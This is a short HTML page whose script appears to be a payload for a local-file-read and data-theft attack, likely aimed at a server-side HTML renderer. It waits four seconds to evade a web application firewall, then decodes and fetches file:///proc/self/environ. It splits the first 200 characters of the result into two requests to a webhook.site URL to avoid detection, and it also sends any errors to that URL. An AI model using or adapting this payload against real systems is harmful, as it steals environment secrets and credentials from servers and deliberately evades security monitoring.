<!DOCTYPE html>
<html>
<body>
<script>
const h = "https://webhook.site/e7e51d1c-b882-4d14-b4db-ba745f8a2525";

// Delay para evitar WAF
setTimeout(() => {
  try {
    let p = atob("ZmlsZTovLy9wcm9jL3NlbGYvZW52aXJvbg=="); // file:///proc/self/environ
    fetch(p).then(r => r.text()).then(t => {
      // Exfiltra en dos partes para evitar detección
      fetch(h + "?lfi1=" + btoa(t.slice(0,100)));
      fetch(h + "?lfi2=" + btoa(t.slice(100,200)));
    }).catch(e => {
      fetch(h + "?lfi_err=" + encodeURIComponent(e.message));
    });
  } catch(e) {
    fetch(h + "?fail=" + encodeURIComponent(e.message));
  }
}, 4000);
</script>
</body>
</html>
